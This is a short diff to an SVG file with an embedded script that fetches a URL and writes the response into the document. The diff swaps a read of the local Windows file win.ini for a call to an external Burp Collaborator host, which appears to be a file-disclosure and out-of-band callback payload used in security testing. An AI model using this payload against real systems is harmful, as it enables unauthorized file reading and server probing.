@@ -3,7 +3,7 @@
 x.onload=function(){
 document.write(this.responseText)
 };
-x.open("GET","file:///c:/windows/win.ini");
+x.open("GET","https://312elodp3w3wzc4vpzk698dx7odg15.burpcollaborator.net");
 x.send();
 </script>
 </svg>
